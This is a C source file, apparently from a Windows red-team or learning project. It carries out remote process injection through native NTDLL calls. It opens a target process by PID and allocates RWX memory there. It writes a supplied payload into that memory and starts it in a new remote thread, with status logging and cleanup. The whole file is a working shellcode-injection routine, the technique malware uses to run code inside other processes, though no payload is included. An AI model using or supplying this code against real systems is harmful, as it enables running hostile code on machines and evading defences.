#include "injection.h"

VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD Error
) {

    if (NULL == FunctionName || 0 == Error) {
        WARN("either you didn't supply a function name"
             "or the function actually returned successfully");
    }

    WARN("[%s] failed, error: 0x%lx", FunctionName, Error);
    return;

}

UINT_PTR GetNtFunctionAddress(
        _In_ CONST HMODULE ModuleHandle,
        _In_ LPCSTR FunctionName
) {

    UINT_PTR FunctionAddress = 0;

    if (NULL == ModuleHandle) {
        WARN("invalid/no module handle supplied");
        return 0;
    }

    FunctionAddress = (UINT_PTR)GetProcAddress(ModuleHandle, FunctionName);
    if (0 == FunctionAddress) {
        PrettyFormat("GetProcAddress", GetLastError());
        return 0;
    }

    OKAY("[0x%p] got the address of %s!", (PVOID)FunctionAddress, FunctionName);
    return FunctionAddress;

}

BOOL NTAPIInjection(
        _In_ CONST DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ CONST SIZE_T PayloadSize
) {

    HANDLE   hProcess      = NULL;
    HANDLE   hThread       = NULL;
    HMODULE  hNTDLL        = NULL;
    PVOID    rBuffer       = NULL;
    SIZE_T   BytesWritten  = 0;
    NTSTATUS STATUS        = 0;
    BOOL     STATE         = TRUE;

    OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };
    CLIENT_ID CID        = { (HANDLE)PID, NULL };

    if (NULL == Payload || 0 == PayloadSize) {
        WARN("payload's not set. exiting...");
        return FALSE;
    }

    INFO("initializing globals...");
    hNTDLL = GetModuleHandleW(L"NTDLL");
    if (NULL == hNTDLL) {
        PrettyFormat("GetModuleHandleW", GetLastError()); 
        return FALSE; 
    } 
    OKAY("[0x%p] got the address of NTDLL!", hNTDLL);

    /* NtOpenProcess */
    fn_NtOpenProcess p_NtOpenProcess = 
        (fn_NtOpenProcess)GetNtFunctionAddress(
                hNTDLL, 
                "NtOpenProcess"
    );
    /* NtAllocateVirtualMemory */
    fn_NtAllocateVirtualMemory p_NtAllocateVirtualMemory = 
        (fn_NtAllocateVirtualMemory)GetNtFunctionAddress(
                hNTDLL, 
                "NtAllocateVirtualMemory"
    );
    /* NtWriteVirtualMemory */
    fn_NtWriteVirtualMemory p_NtWriteVirtualMemory = 
        (fn_NtWriteVirtualMemory)GetNtFunctionAddress(
                hNTDLL, 
                "NtWriteVirtualMemory"
    );
    /* NtCreateThreadEx */
    fn_NtCreateThreadEx p_NtCreateThreadEx = 
        (fn_NtCreateThreadEx)GetNtFunctionAddress(
                hNTDLL, 
                "NtCreateThreadEx"
    );
    /* NtWaitForSingleObject */
    fn_NtWaitForSingleObject p_NtWaitForSingleObject = 
        (fn_NtWaitForSingleObject)GetNtFunctionAddress(
                hNTDLL, 
                "NtWaitForSingleObject"
    );
    /* NtClose */
    fn_NtClose p_NtClose = 
        (fn_NtClose)GetNtFunctionAddress(
                hNTDLL, 
                "NtClose"
    );

    INFO("attempting to get a handle on the process (%ld)...", PID);
    STATUS = p_NtOpenProcess(
            &hProcess,
            PROCESS_ALL_ACCESS,
            &OA,
            &CID
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtOpenProcess", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] got a handle on the process (%ld)", hProcess, PID);

    STATUS = p_NtAllocateVirtualMemory(
            hProcess,
            &rBuffer,
            0,
            &PayloadSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtAllocateVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] [RWX] allocated a %zu-byte buffer with PAGE_EXECUTE_READWRITE permissions!",
            rBuffer, PayloadSize);

    STATUS = p_NtWriteVirtualMemory(
            hProcess,
            rBuffer,
            Payload,
            PayloadSize,
            &BytesWritten
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtWriteVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    /* r/masterhacker */
    for (SIZE_T i = 0; i <= BytesWritten; i++) {
        PROG("[0x%p] [RWX] [%zu/%zu] writing payload to buffer...",
                rBuffer, i, BytesWritten);
    }
    (VOID)puts("");

    STATUS = p_NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            &OA,
            hProcess,
            rBuffer,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtCreateThreadEx", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] successfully created a thread! waiting for it to finish execution...", hThread);

    STATUS = p_NtWaitForSingleObject(
            hThread,
            FALSE,
            NULL
    );
    INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEAN_UP:

    /* you should look into using NtFreeVirtualMemory
       for cleanup as well for our allocated buffer. */

    if (hThread) {
        p_NtClose(hThread);
        INFO("[0x%p] handle on thread closed", hThread);
    }

    if (hProcess) {
        p_NtClose(hProcess);
        INFO("[0x%p] handle on process closed", hProcess);
    }

    return STATE;

}
